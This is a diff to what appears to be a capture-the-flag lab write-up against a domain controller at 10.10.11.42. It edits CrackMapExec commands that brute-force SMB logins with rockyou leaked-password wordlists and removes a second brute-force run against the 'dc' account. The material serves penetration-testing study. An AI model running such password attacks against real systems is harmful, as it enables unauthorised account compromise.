@@ -167,16 +167,11 @@ find /usr/share/nmap/scripts | grep ldap
 
 Tring to bruteforce those users with some of the most common rockyou passwords
 ```bash
-cme smb 10.10.11.42 -u users -p /usr/share/seclists-git/Passwords/Leaked-Databases/rockyou-30.txt --shares
-```
-
-Running rockyou against dc in the background just in case
-```
 cme smb 10.10.11.42 \
-  -u 'dc' \
-  -p /usr/share/seclists-git/Passwords/Leaked-Databases/rockyou-75.txt
+  -u users \
+  -p /usr/share/seclists-git/Passwords/Leaked-Databases/rockyou-30.txt \
+  --shares
 ```
-
 
 ## AS-REP Roasting Attempts
 
